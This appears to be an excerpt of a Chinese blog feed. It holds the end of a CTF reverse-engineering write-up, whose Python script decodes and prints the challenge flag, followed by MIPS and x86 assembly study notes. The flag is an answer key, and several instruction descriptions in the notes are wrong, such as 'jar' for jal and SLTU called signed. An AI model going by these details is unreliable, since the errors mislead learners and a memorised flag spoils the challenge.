<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">0x51</span>, <span class="number">0x7c</span>, <span class="number">0x6a</span>, <span class="number">0x7b</span>, <span class="number">0x67</span>, <span class="number">0x52</span>, <span class="number">0xFD</span>, <span class="number">0x16</span>, <span class="number">0xA4</span>, <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0x92</span>, <span class="number">0x80</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x54</span>,</span><br><span class="line">       <span class="number">0xA0</span>, <span class="number">0x8D</span>, <span class="number">0x45</span>, <span class="number">0x18</span>, <span class="number">0x81</span>, <span class="number">0xDE</span>, <span class="number">0xFC</span>, <span class="number">0x95</span>, <span class="number">0xF0</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0x1A</span>, <span class="number">0x15</span>, <span class="number">0x5B</span>, <span class="number">0x75</span>, <span class="number">0x1F</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">2</span>):</span><br><span class="line">        key[i] = (key[i] &lt;&lt; <span class="number">2</span>) | (key[i] &gt;&gt; <span class="number">6</span>)  <span class="comment"># 循环左移2位</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key[i] = (key[i] &gt;&gt; <span class="number">2</span>) | (key[i] &lt;&lt; <span class="number">6</span>)  <span class="comment"># 循环右移2位</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    key[i] ^= <span class="number">32</span>-i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    flag += chr(i &amp; <span class="number">0xff</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#qctf&#123;ReA11y_4_B@89_mlp5_4_XmAn_&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>汇编</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>MIPS汇编笔记</title>
    <url>/2020/01/11/MIPS%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="MIPS汇编语言基础"><a href="#MIPS汇编语言基础" class="headerlink" title="MIPS汇编语言基础"></a>MIPS汇编语言基础</h1><p>　　MIPS的系统结构及设计理念比较先进，其指令系统经过通用处理器指令体系MIPS I、MIPS II、MIPS III、MIPS IV、MIPS V，以及嵌入式指令体系MIPS16、MIPS32到MIPS64的发展。</p>
<p>　　MIPS32的架构是一种基于固定长度的定期编码指令集，并采用导入/存储（load/store)数据模型。经改进，这种架构可支持高级语言的优化执行。在路由器中，经常使用的一种MIPS架构就是MIPS32。</p>
<p>MIPS寄存器</p>
<p>　　RISC的一个显著特点就是大量使用寄存器。因为寄存器的存取可以在一个时钟周期内完成，同时简化了寻找方式，所以，MIPS32的指令中除了加载/存储指令以外，都使用寄存器或者立即数作为操作数，以便让编译器通过保持对寄存器内数据的频繁存取进一步优化代码的生成性能。</p>
<p>　　MIPS32寄存器分为两类：通用寄存器（GPR)和特殊寄存器。</p>
<h2 id="通用寄存器（GPR）"><a href="#通用寄存器（GPR）" class="headerlink" title="通用寄存器（GPR）"></a>通用寄存器（GPR）</h2><p>　　在MIPS体系结构中有32个通用寄存器，寄存器标志由 $ 开头，在汇编程序中可以用编号$0~$31表示，也可以用寄存器的名字表示，如$sp、$t1、$at等，如图，堆栈是从内存的高地址方向向低地址方向增长的。</p>
<table>
<thead>
<tr>
<th>编号</th>
<th>寄存器名称</th>
<th>寄存器描述</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>$zero</td>
<td>第0号寄存器，其值始终为0</td>
</tr>
<tr>
<td>1</td>
<td>$at</td>
<td>保留寄存器</td>
</tr>
<tr>
<td>2～3</td>
<td>$v0~$v1</td>
<td>values, 保存表达式或函数返回结果</td>
</tr>
<tr>
<td>4-7</td>
<td>$a0~$a3</td>
<td>aruments, 作为函数的前4个参数</td>
</tr>
<tr>
<td>8～15</td>
<td>$t0~$t7</td>
<td>temporaries，供汇编程序使用的临时寄存器</td>
</tr>
<tr>
<td>16～23</td>
<td>$s0~$s7</td>
<td>saved values，子函数使用时需要先保存原寄存器的值</td>
</tr>
<tr>
<td>24～25</td>
<td>$t8~$t9</td>
<td>temporaries, 供汇编程序的临时寄存器，补充$t0~$t7</td>
</tr>
<tr>
<td>26~27</td>
<td>$k0~$k1</td>
<td>保留，中断处理函数使用</td>
</tr>
<tr>
<td>28</td>
<td>$gp</td>
<td>global pointer，全局指针</td>
</tr>
<tr>
<td>29</td>
<td>$sp</td>
<td>stack pointer, 堆栈指针，指向堆栈的栈顶</td>
</tr>
<tr>
<td>30</td>
<td>$fp</td>
<td>frame pointer, 保存栈指针</td>
</tr>
<tr>
<td>31</td>
<td>$ra</td>
<td>return address, 返回地址</td>
</tr>
</tbody></table>
<ul>
<li>$0：即 ​$zero，该寄存器总是返回0，为0这个有用常数提供了一个简洁的编码形式。在MIPS处理器的通用寄存器中，没有任何帮助运算判断的标志寄存器，要实现相应的功能时，都是通过测试两个寄存器是否相等完成的。MIPS编译器常常会使用slt、beq、bne等指令和由寄存器 $0 获得0值产生比较所有的比较条件，如相等、不等、小于等于、大于、大于等于。还可以用add指令创建move伪指令，如”move $t0, $t1; $t0=$t1”实际为“add $t0,$0,$t1; $t0= $t1 + 0”。使用MIPS伪指令可以简化任务。</li>
<li>$1 ($at) : 该寄存器为汇编保留，用做汇编器的暂时变量。</li>
<li>$2~$3($v0~$v1): 用于存放子程序的返回值或非浮点结果。当这两个寄存器不够存放返回值时，编译器通过内存来完成。</li>
<li>$4~​$7($a0~$a3)：用于将前4个参数传递给子程序，不够的用堆栈处理。$a0~$a3、$v0~$v1和$ra 一起完成子程序函数调用过程，分别用以传递参数、返回结果和存放返回地址。当需要使用更多的寄存器时就需要堆栈了。MIPS编译器总是为参数在堆栈中留有空间，以防有参数需要存储。</li>
<li>$8~$15($t0~$t7): 一个子函数可以不用保存并随意使用这些寄存器。在进行表达式计算时，这些寄存器是非常好的临时变量。在使用时需要注意，当调用一个子函数时，这些寄存器的值有可能被子函数破坏。</li>
<li>$16~$23($s0~$s7): 子函数必须保证当函数返回时这些寄存器的内容将恢复到函数调用以前的值，或者子函数里不使用这些寄存器或把它们保存在堆栈上并保存在函数退出时恢复。这种约定使这些寄存器非常适合作为寄存器变量，或者用于存放一些函数调用期间必须保存的原值。</li>
<li>$24~$25($t8~$t9): 同$t0~$t7,作为$t0~$t7寄存器补充。</li>
<li>$26~$27($k0~$k1): 通常被中断或异常处理程序使用，以保存一些系统参数。</li>
<li>$28($gp): C语言中有两种存储类型，分别是自动型和静态型。自动变量是一个函数中的局部变量。静态变量在进入和退出一个函数时都是存在的。为了简化静态数据的访问，MIPS保留了一个寄存器作为全局指针gp在编译时，数据需要在以gp为基指针的64KB范围内。</li>
<li>$29($sp): MIPS硬件并不直接支持堆栈，X86有单独的PUSH和POP指令，而MIPS没有单独的栈操作指令，所有对栈的操作都是统一的内存访问方式，单这并非不影响MIPS使用堆栈。在发生函数调用时，调用者把函数调用之后要用的寄存器压入堆栈，被调用者把返回地址寄存器$ra（并非任何时候都保存$ra)和保留寄存器压入堆栈。同时，调整堆栈指针，并在返回时从堆栈中恢复寄存器。</li>
<li>$30($fp): 不同编译器可能对该寄存器使用方法不同。GNU MIPS C编译器使用了栈指针(Frame Pointer)。SGI的C编译器则没有使用栈指针，只是把这个寄存器当成保存寄存器使用（$s8)，这虽然节省了调用和返回开销，但增加了代码生成的复杂度性。</li>
<li>$31 ($ra): 存放返回地址。MIPS没有call和retn指令，MIPS有一个jar（jump-and-link,跳转并链接）指令，在跳转到某个地址时可把下一条指令的地址放到$ra中，用于支持子程序。例如，调用程序把参数放到$a0~$a3中，“jar X”指令跳到X过程，被调用时需要保存的寄存器为$a0~$a3、$s0~$s7、$gp、$sp、$fp、$ra。</li>
</ul>
<h2 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h2><p>　　MIPS32架构中定义了3个特殊寄存器。分别为PC（程序计数器）、HI(乘除结果高位寄存器）和LO(乘除结果低位寄存器）。在进行乘法运算时，HI和LO保存乘法的运算结果，其中HI存储高32位，LO存储低32位；而在进行除法运算时，HI保存余数，LO存储商。</p>
<h1 id="程序结构"><a href="#程序结构" class="headerlink" title="程序结构"></a>程序结构</h1><ul>
<li>本质其实就只是数据声明+普通文本+程序编码（文件后缀为.s，或者.asm也行）</li>
<li>数据声明在代码段之后</li>
</ul>
<h2 id="数据声明"><a href="#数据声明" class="headerlink" title="数据声明"></a>数据声明</h2><ul>
<li>数据段以 <strong>.data</strong>为开始标志</li>
<li>声明变量后，即在主存中分配空间。</li>
</ul>
<h2 id="代码-指令集"><a href="#代码-指令集" class="headerlink" title="代码(指令集)"></a>代码(指令集)</h2><ul>
<li>代码段以 <strong>.text</strong>为开始标志</li>
<li>程序入口为<strong>main：</strong>标志</li>
</ul>
<h1 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h1><p><strong>直接寻址</strong>：<code>la    $v0,var</code>     var的值就是地址</p>
<p><strong>寄存器存储地址</strong>:<code>la    $v0,($v1)</code>    $v1存储的值是一个地址，将地址取出再寻址(类似指针)</p>
<p><em><strong>偏移</strong></em>：<code>la    $v0,2($v1)</code>    $v1中存储的地址取出再+2再寻址</p>
<h1 id="MIPS指令格式"><a href="#MIPS指令格式" class="headerlink" title="MIPS指令格式"></a>MIPS指令格式</h1><p>MIPS所有指令都是32位，指令格式简单且固定。</p>
<p><strong>R格式</strong></p>
<table>
<thead>
<tr>
<th align="center">6</th>
<th align="center">5</th>
<th align="center">5</th>
<th align="center">5</th>
<th align="center">5</th>
<th align="center">6</th>
</tr>
</thead>
<tbody><tr>
<td align="center">op</td>
<td align="center">rs</td>
<td align="center">rt</td>
<td align="center">rd</td>
<td align="center">shamt</td>
<td align="center">funct</td>
</tr>
</tbody></table>
<p>用处：<br>寄存器-寄存器ALU操作<br>读写专用寄存器</p>
<p><strong>I格式</strong></p>
<table>
<thead>
<tr>
<th align="center">6</th>
<th align="center">5</th>
<th align="center">5</th>
<th align="center">16</th>
</tr>
</thead>
<tbody><tr>
<td align="center">op</td>
<td align="center">rs</td>
<td align="center">rt</td>
<td align="center">立即数操作</td>
</tr>
</tbody></table>
<p>用处：<br>加载/存储字节，半字，字，双字<br>条件分支，跳转，跳转并链接寄存器</p>
<p><strong>J格式</strong></p>
<table>
<thead>
<tr>
<th align="center">6</th>
<th align="center">26</th>
</tr>
</thead>
<tbody><tr>
<td align="center">op</td>
<td align="center">跳转地址</td>
</tr>
</tbody></table>
<p>用处：<br>跳转，跳转并链接<br>陷阱和从异常中返回</p>
<blockquote>
<p>各字段含义：<br>op:指令基本操作，称为操作码。<br>rs:第一个源操作数寄存器。<br>rt:第二个源操作数寄存器。<br>rd:存放操作结果的目的操作数。<br>shamt:位移量；<br>funct:函数，这个字段选择op操作的某个特定变体。</p>
<p>在指令代码中目的操作数在操作数最后，但是在书写代码时还是习惯和x86一样放在最前面</p>
</blockquote>
<p>例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add $t0,$s0,$s1  1</span><br></pre></td></tr></table></figure>

<p>表示<code>$t0=$s0+$s1</code>,即16号寄存器（s0)的内容和17号寄存器(s1)的内容相加，结果放到8号寄存器(t0)。<br>指令各字段的十进制表示为：</p>
<table>
<thead>
<tr>
<th align="center">0</th>
<th align="center">16</th>
<th align="center">17</th>
<th align="center">8</th>
<th align="center">0</th>
<th align="center">32</th>
</tr>
</thead>
<tbody><tr>
<td align="center">op</td>
<td align="center">rs($s0)</td>
<td align="center">rt($s1)</td>
<td align="center">rd($t0)</td>
<td align="center">shamt</td>
<td align="center">funct</td>
</tr>
</tbody></table>
<p>op=0和funct=32表示这是加法，<br>16=s0表示第一个源操作数(rs)在16号寄存器里，17=s0表示第一个源操作数(rs)在16号寄存器里，17=s1表示第二个源操作数(rt)在17号寄存器里，<br>8=$t0表示目的操作数(rd)在8号寄存器里。</p>
<h1 id="MIPS-指令"><a href="#MIPS-指令" class="headerlink" title="MIPS 指令"></a>MIPS 指令</h1><table>
<thead>
<tr>
<th>指令</th>
<th>功能</th>
<th>应用实例</th>
</tr>
</thead>
<tbody><tr>
<td>LB</td>
<td>从存储器中读取一个字节的数据到寄存器中</td>
<td>LB R1, 0(R2)</td>
</tr>
<tr>
<td>LH</td>
<td>从存储器中读取半个字的数据到寄存器中</td>
<td>LH R1, 0(R2)</td>
</tr>
<tr>
<td>LW</td>
<td>从存储器中读取一个字的数据到寄存器中</td>
<td>LW R1, 0(R2)</td>
</tr>
<tr>
<td>LD</td>
<td>从存储器中读取双字的数据到寄存器中</td>
<td>LD R1, 0(R2)</td>
</tr>
<tr>
<td>L.S</td>
<td>从存储器中读取单精度浮点数到寄存器中</td>
<td>L.S R1, 0(R2)</td>
</tr>
<tr>
<td>L.D</td>
<td>从存储器中读取双精度浮点数到寄存器中</td>
<td>L.D R1, 0(R2)</td>
</tr>
<tr>
<td>LBU</td>
<td>功能与LB指令相同，但读出的是不带符号的数据</td>
<td>LBU R1, 0(R2)</td>
</tr>
<tr>
<td>LHU</td>
<td>功能与LH指令相同，但读出的是不带符号的数据</td>
<td>LHU R1, 0(R2)</td>
</tr>
<tr>
<td>LWU</td>
<td>功能与LW指令相同，但读出的是不带符号的数据</td>
<td>LWU R1, 0(R2)</td>
</tr>
<tr>
<td>SB</td>
<td>把一个字节的数据从寄存器存储到存储器中</td>
<td>SB R1, 0(R2)</td>
</tr>
<tr>
<td>SH</td>
<td>把半个字节的数据从寄存器存储到存储器中</td>
<td>SH R1，0(R2)</td>
</tr>
<tr>
<td>SW</td>
<td>把一个字的数据从寄存器存储到存储器中</td>
<td>SW R1, 0(R2)</td>
</tr>
<tr>
<td>SD</td>
<td>把两个字节的数据从寄存器存储到存储器中</td>
<td>SD R1, 0(R2)</td>
</tr>
<tr>
<td>S.S</td>
<td>把单精度浮点数从寄存器存储到存储器中</td>
<td>S.S R1, 0(R2)</td>
</tr>
<tr>
<td>S.D</td>
<td>把双精度数据从存储器存储到存储器中</td>
<td>S.D R1, 0(R2)</td>
</tr>
<tr>
<td>DADD</td>
<td>把两个定点寄存器的内容相加，也就是定点加</td>
<td>DADD R1,R2,R3</td>
</tr>
<tr>
<td>DADDI</td>
<td>把一个寄存器的内容加上一个立即数</td>
<td>DADDI R1,R2,#3</td>
</tr>
<tr>
<td>DADDU</td>
<td>不带符号的加</td>
<td>DADDU R1,R2,R3</td>
</tr>
<tr>
<td>DADDIU</td>
<td>把一个寄存器的内容加上一个无符号的立即数</td>
<td>DADDIU R1,R2,#3</td>
</tr>
<tr>
<td>ADD.S</td>
<td>把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数</td>
<td>ADD.S F0,F1,F2</td>
</tr>
<tr>
<td>ADD.D</td>
<td>把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数</td>
<td>ADD.D F0,F1,F2</td>
</tr>
<tr>
<td>ADD.PS</td>
<td>两个单精度浮点数相加，结果是单精度浮点数</td>
<td>ADD.PS F0,F1,F2</td>
</tr>
<tr>
<td>DSUB</td>
<td>两个寄存器的内容相减，也就是定点数的减</td>
<td>DSUB R1,R2,R3</td>
</tr>
<tr>
<td>DSUBU</td>
<td>不带符号的减</td>
<td>DSUBU R1,R2,R3</td>
</tr>
<tr>
<td>SUB.S</td>
<td>一个双精度浮点数减去一个单精度浮点数，结果为单精度</td>
<td>SUB.S F1,F2,F3</td>
</tr>
<tr>
<td>SUB.D</td>
<td>一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数</td>
<td>SUB.D F1,F2,F3</td>
</tr>
<tr>
<td>SUB.PS</td>
<td>两个单精度浮点数相减</td>
<td>SUB.SP F1,F2,F3</td>
</tr>
<tr>
<td>DDIV</td>
<td>两个定点寄存器的内容相除，也就是定点除</td>
<td>DDIV Ｒ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td>DDIVU</td>
<td>不带符号的除法运算</td>
<td>DDIVU Ｒ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td>DIV.S</td>
<td>一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数</td>
<td>DIV.S F1,F2,F3</td>
</tr>
<tr>
<td>DIV.D</td>
<td>一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数</td>
<td>DIV.D F1,F2,F3</td>
</tr>
<tr>
<td>DIV.PS</td>
<td>两个单精度浮点数相除，结果为单精度</td>
<td>DIV.PS F1,F2,F3</td>
</tr>
<tr>
<td>DMUL</td>
<td>两个定点寄存器的内容相乘，也就是定点乘</td>
<td>DMUL Ｒ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td>DMULU</td>
<td>不带符号的乘法运算</td>
<td>DMULU R1,R2,R3</td>
</tr>
<tr>
<td>MUL.S</td>
<td>一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数</td>
<td>DMUL.S F1,F2,F3</td>
</tr>
<tr>
<td>MUL.D</td>
<td>一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数</td>
<td>DMUL.D F1,F2,F3</td>
</tr>
<tr>
<td>MUL.PS</td>
<td>两个单精度浮点数相乘，结果为单精度浮点数</td>
<td>DMUL.PS F1,F2,F3</td>
</tr>
<tr>
<td>AND</td>
<td>与运算，两个寄存器中的内容相与</td>
<td>ANDＲ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td>ANDI</td>
<td>一个寄存器中的内容与一个立即数相与</td>
<td>ANDIＲ1,Ｒ2,#3</td>
</tr>
<tr>
<td>OR</td>
<td>或运算，两个寄存器中的内容相或</td>
<td>ORＲ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td>ORI</td>
<td>一个寄存器中的内容与一个立即数相或</td>
<td>ORIＲ1,Ｒ2,#3</td>
</tr>
<tr>
<td>XOR</td>
<td>异或运算，两个寄存器中的内容相异或</td>
<td>XORＲ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td>XORI</td>
<td>一个寄存器中的内容与一个立即数异或</td>
<td>XORIＲ1,Ｒ2,#3</td>
</tr>
<tr>
<td>BEQZ</td>
<td>条件转移指令，当寄存器中内容为0时转移发生</td>
<td>BEQZ R1,0</td>
</tr>
<tr>
<td>BNEZ</td>
<td>条件转移指令，当寄存器中内容不为0时转移发生</td>
<td>BNEZ R1,0</td>
</tr>
<tr>
<td>BEQ</td>
<td>条件转移指令，当两个寄存器内容相等时转移发生</td>
<td>BEQ R1,R2</td>
</tr>
<tr>
<td>BNE</td>
<td>条件转移指令，当两个寄存器中内容不等时转移发生</td>
<td>BNE R1,R2</td>
</tr>
<tr>
<td>J</td>
<td>直接跳转指令，跳转的地址在指令中</td>
<td>J name</td>
</tr>
<tr>
<td>JR</td>
<td>使用寄存器的跳转指令，跳转地址在寄存器中</td>
<td>JR R1</td>
</tr>
<tr>
<td>JAL</td>
<td>直接跳转指令，并带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31这个寄存器中</td>
<td>JAL R1 name</td>
</tr>
<tr>
<td>JALR</td>
<td>使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31这个寄存器中</td>
<td>JALR R1</td>
</tr>
<tr>
<td>MOV.S</td>
<td>把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td>
<td>MOV.S F0,F1</td>
</tr>
<tr>
<td>MOV.D</td>
<td>把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td>
<td>MOV.D F0,F1</td>
</tr>
<tr>
<td>MFC0</td>
<td>把一个数据从通用寄存器复制到特殊寄存器</td>
<td>MFC0 R1,R2</td>
</tr>
<tr>
<td>MTC0</td>
<td>把一个数据从特殊寄存器复制到通用寄存器</td>
<td>MTC0 R1,R2</td>
</tr>
<tr>
<td>MFC1</td>
<td>把一个数据从定点寄存器复制到浮点寄存器</td>
<td>MFC1 R1,F1</td>
</tr>
<tr>
<td>MTC1</td>
<td>把一个数据从浮点寄存器复制到定点寄存器</td>
<td>MTC1 R1,F1</td>
</tr>
<tr>
<td>LUI</td>
<td>把一个16位的立即数填入到寄存器的高16位，低16位补零</td>
<td>LUI R1,#42</td>
</tr>
<tr>
<td>DSLL</td>
<td>双字逻辑左移</td>
<td>DSLL R1,R2,#2</td>
</tr>
<tr>
<td>DSRL</td>
<td>双字逻辑右移</td>
<td>DSRL R1,R2,#2</td>
</tr>
<tr>
<td>DSRA</td>
<td>双字算术右移</td>
<td>DSRA R1,R2,#2</td>
</tr>
<tr>
<td>DSLLV</td>
<td>可变的双字逻辑左移</td>
<td>DSLLV R1,R2,#2</td>
</tr>
<tr>
<td>DSRLV</td>
<td>可变的双字罗伊右移</td>
<td>DSRLV R1,R2,#2</td>
</tr>
<tr>
<td>DSRAV</td>
<td>可变的双字算术右移</td>
<td>DSRAV R1,R2,#2</td>
</tr>
<tr>
<td>SLT</td>
<td>如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0</td>
<td>SLT R1,R2,R3</td>
</tr>
<tr>
<td>SLTI</td>
<td>如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0</td>
<td>SLTI R1,R2,#23</td>
</tr>
<tr>
<td>SLTU</td>
<td>功能与SLT一致，但是带符号的</td>
<td>SLTU R1,R2,R3</td>
</tr>
<tr>
<td>SLTUI</td>
<td>功能与SLT一致，但不带符号</td>
<td>SLTUI R1,R2,R3</td>
</tr>
<tr>
<td>MOVN</td>
<td>如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器</td>
<td>MOVN R1,R2,R3</td>
</tr>
<tr>
<td>MOVZ</td>
<td>如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器</td>
<td>MOVZ R1,R2,R3</td>
</tr>
<tr>
<td>TRAP</td>
<td>根据地址向量转入管态</td>
<td></td>
</tr>
<tr>
<td>ERET</td>
<td>从异常中返回到用户态</td>
<td></td>
</tr>
<tr>
<td>MADD.S</td>
<td>一个双精度浮点数与单精度浮点数相乘加，结果为单精度</td>
<td></td>
</tr>
<tr>
<td>MADD.D</td>
<td>一个双精度浮点数与单精度浮点数相乘加，结果为双精度</td>
<td></td>
</tr>
<tr>
<td>MADD.PS</td>
<td>两个单精度浮点数相乘加，结果为单精度</td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>汇编</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编基础</title>
    <url>/2019/10/25/huibianjichu/</url>
    <content><![CDATA[<h3 id="什么是汇编"><a href="#什么是汇编" class="headerlink" title="什么是汇编"></a>什么是汇编</h3><p>汇编是一种低级语言，直接描述/控制CPU的运行，反映底层原理。CPU只能理解二进制机器码，而人需要用高级语言来帮助开发，高级语言写好后都会经过”编译”过程翻译成机器码(01串)然后给CPU执行，而汇编就是机器码的指令一对一翻译过来，比机器码高级一点，既能反映底层原理，又比机器码易读的一种语言。</p>
<h3 id="汇编分类"><a href="#汇编分类" class="headerlink" title="汇编分类"></a>汇编分类</h3><h4 id="按汇编风格："><a href="#按汇编风格：" class="headerlink" title="按汇编风格："></a>按汇编风格：</h4><p>(1) Intel汇编，被Microsoft Windows/Visual C++采用。<br>(2) AT&amp;T汇编，被GNU/Gas采用。(Gas也可使用Intel汇编风格)<br>两者只是符号系统有所不同，含义大同小异。</p>
<h4 id="按CPU体系："><a href="#按CPU体系：" class="headerlink" title="按CPU体系："></a>按CPU体系：</h4><p>(1) IBM PC汇编(Intel汇编)，IBM最早推出PC机，后来很多体系都与它兼容。<br>(2) ARM汇编。<br>两者互不兼容。</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>CPU只能运算，无法储存数据，数据一般储存在内存中，CPU要从内存中读取数据再进行计算。但是因为CPU运算速度远快于从内存读取数据的速度，每次运算都去内存中寻址后读取数据再运行就会明显拖慢速度，为了避免速度被拖慢，CPU自带有一级缓存和二级缓存，但是CPU从缓存中读取数据的速度依然不够快，而且数据在缓存中储存位置也不固定，每次读取也需要寻址，还是会拖慢速度。所以CPU有了寄存器(Register),用来储存最常用的数据，而且每个寄存器一般有规定储存某一种常用数据，CPU就优先从寄存器读取数据，由寄存器和内存进行数据交换。CPU的位数其实就是指CPU中寄存器的位数，32位CPU中寄存器就是32位(4字节)。<br>x86常用寄存器(都为32位)：<br>EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP，EIP。<br>其中前6个都是通用寄存器，不指定用途，但在以前这些寄存器有被指定用途，现在在使用习惯上这些用途也被保留了下来，但不强行要求。ESP，EBP和EIP有专门用途，ESP用来储存栈指针(指示栈顶位置)，EBP用来储存基址指针(指示子程序或函数调用的基址),通常用[EBP+立即数]来获取上层函数传入的参数，用[EBP-立即数]来访问当前函数的局部变量，EIP用来指向程序下一条要执行的命令的地址。EAX, EBX, ECX, EDX的两位低字节可独立使用，两位低字节中的两个字节也可以独立使用，例如如四字节EAX的后两位低字节是EX，两字节的EX中前一字节为AH，后一字节为AL。且寄存器大小写不敏感。<br><img src="https://s2.ax1x.com/2019/10/26/K0mY2d.png"></p>
<h3 id="常用标志位-标志寄存器"><a href="#常用标志位-标志寄存器" class="headerlink" title="常用标志位(标志寄存器)"></a>常用标志位(标志寄存器)</h3><p>CF 进位标志，加法进位或减法借位时置1，否则置0；<br>PF 奇偶标志，反映操作结果中”1”的数量，若有偶数个”1”则置1，奇数个则置0；<br>AF 辅助进位标志，当第3位(半字节)出现进位或借位时AF=1，否则AF=0；<br>ZF 零标志，运算结果为0则置1，否则置0；<br>SF 符号标志，当运算结果为负数，即最高位为1时置1，否则置0；<br>OF 溢出标志，进行算数运算的结果值超出了8位或者16位的表示范围则置1，否则置0(正数相加得到负数，或者负数相加得到正数；符号位进位^数据最高位进位)；<br>TF 陷阱标志，为调试程序设的，设置TF=1时CPU处于单步执行指令的模式，设置TF=0时正常执行程序；<br>DF 方向标志，用来控制数据串操作指令的步进方向，当设置DF=1时，将以递减顺序对数据串中的数据进行处理。当设置DF=0时，递增。  </p>
<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>程序运行时操作系统会为其分配一段内存供其使用。</p>
<h4 id="Heap-堆"><a href="#Heap-堆" class="headerlink" title="Heap(堆)"></a>Heap(堆)</h4><p>堆是用户主动从内存中申请的空间，从低地址往高地址增长，堆的空间必须手动释放或者由垃圾回收机制来释放，不会随着程序运行自行释放，即使程序已经不会再用到这段空间。</p>
<h4 id="Stack-栈"><a href="#Stack-栈" class="headerlink" title="Stack(栈)"></a>Stack(栈)</h4><p>栈是函数运行产生的临时分配内存区域，从高地址向低地址增长，每调用一个函数都会为其分一段内存称为一个帧，函数结束之后自动释放。</p>
<h3 id="常用汇编指令"><a href="#常用汇编指令" class="headerlink" title="常用汇编指令"></a>常用汇编指令</h3><p>汇编指令一般的结构是  <code>操作码 目的操作数, 源操作数</code>，比如<code>mov eax,0x1</code>，也有只有一个操作数或是没有操作数的指令(一般是有默认的隐含操作数)，比如<code>inc eax</code>，让eax的值+1，相当于<code>add eax, 0x1</code>，0x1相当于源操作数默认没有写出来。</p>
<p>目的操作数可以被读取或者写入，源操作数只能被读取，也就是说指令不会改变源操作数的值。</p>
<h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>将数据压入栈中，然后栈顶下移。这条指令会先按照将要要压入栈中的数据类型所占的内存大小将ESP的值减小，然后将值写入ESP指向的地址。</p>
<h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><p>用于调用函数，在栈中新建一个帧，将call指令后面一条指令的地址压入栈中，然后将EIP指向call的地址，程序就掉头去执行call的地址位置的指令，从而实现函数调用。</p>
<h4 id="ret-retn"><a href="#ret-retn" class="headerlink" title="ret(retn)"></a>ret(retn)</h4><p>结束当前函数，回收当前函数的帧，程序回到上层函数运行。从栈中将call指令下一条指令的地址取出给EIP，调用的函数结束程序回到上层函数。</p>
<h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov EAX,n 表示将n写入EAX寄存器中。<br>mov EAX,[ESP+4] 表示将ESP的值加上4，然后把这个值当作地址，取该地址的值写入EAX，中括号即表示取值。</p>
<h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>取出最近一个压入栈中的值写入指定位置。<br>pop EAX 表示将栈中最近一个压入的值取出写道EAX寄存器中，而且还会回收栈中该数据的空间回收，即让ESP增大。</p>
<h4 id="add-加-，sub-减-，xor-异或-，inc-自增-，dec-自减"><a href="#add-加-，sub-减-，xor-异或-，inc-自增-，dec-自减" class="headerlink" title="add(加)，sub(减)，xor(异或)，inc(自增)，dec(自减)"></a>add(加)，sub(减)，xor(异或)，inc(自增)，dec(自减)</h4><p>add a,b 表示将a和b相加并将结果写入a中，a可以是寄存器或内存单元，b可以是寄存器，内存单元也可以是数据。<br>sub，xor指令同理。<br>inc a 表示将a的值+1，dec同理。</p>
<h4 id="shl-左移-和shr-右移"><a href="#shl-左移-和shr-右移" class="headerlink" title="shl(左移)和shr(右移)"></a>shl(左移)和shr(右移)</h4><h4 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h4><p>cmp a,b<br>两值比较。(将两个值相减，仅改变标志位，不返回结果)</p>
